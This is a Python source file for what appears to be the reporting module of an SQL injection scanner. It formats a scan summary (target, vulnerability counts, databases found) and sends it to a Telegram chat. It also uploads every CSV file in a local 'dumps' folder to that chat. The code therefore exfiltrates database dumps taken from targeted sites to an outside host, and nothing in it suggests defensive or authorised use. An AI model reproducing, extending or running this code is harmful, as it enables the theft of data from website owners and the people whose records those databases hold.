from telegram import Bot
from telegram.constants import ParseMode
import os

class TelegramReporter:
    def __init__(self):
        self.bot = Bot(token=os.getenv("TELEGRAM_TOKEN"))
        self.chat_id = os.getenv("TELEGRAM_CHAT_ID")
    
    def send_report(self, scan_data):
        message = self.format_message(scan_data)
        
        try:
            self.bot.send_message(
                chat_id=self.chat_id,
                text=message,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            
            # Send dump files if they exist
            if os.path.exists("dumps"):
                for file in os.listdir("dumps"):
                    if file.endswith(".csv"):
                        with open(f"dumps/{file}", "rb") as f:
                            self.bot.send_document(
                                chat_id=self.chat_id,
                                document=f,
                                caption=f"Dump: {file}"
                            )
        except Exception as e:
            print(f"Telegram error: {e}")
    
    def format_message(self, data):
        return f"""
*SQLi Scan Report*

🔗 *Target*: `{data['target']}`
📊 *Vulnerabilities*:
  🔴 Critical: {data['vulnerabilities']['critical']}
  🟠 Medium: {data['vulnerabilities']['medium']}
  🔵 Low: {data['vulnerabilities']['low']}

📂 *Databases Found*: {len(data['databases'])}
"""